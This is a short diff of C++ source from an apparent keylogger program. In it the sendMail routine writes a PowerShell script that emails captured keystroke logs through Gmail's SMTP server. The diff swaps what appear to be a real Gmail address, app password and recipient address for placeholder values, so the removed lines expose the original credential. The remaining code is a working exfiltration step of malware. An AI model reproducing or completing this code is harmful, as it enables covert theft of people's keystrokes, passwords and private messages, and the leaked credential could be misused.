@@ -150,10 +150,10 @@ void save(char key) {
 void sendMail(string mail){
     ofstream myfile;
     myfile.open("Keylogger.ps1");
-    myfile << "$Myemail=\"jaydenoerson95@gmail.com\"\n";
-    myfile << "$Mypass=\"kbhnzkgavdbsszng\"\n";
+    myfile << "$Myemail=\"username@gmail.com\"\n";
+    myfile << "$Mypass=\"password\"\n";
     myfile << "$SMTP=\"smtp.gmail.com\"\n";
-    myfile << "$to=\"grizzlierbear95@gmail.com\"\n";
+    myfile << "$to=\"username@gmail.com\"\n";
     myfile << "$Subject=\"Keylogger\"\n";
     myfile << "$Body=\"Latest entries in the log = " << mail << "\"\n";
     myfile << "$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force\n";
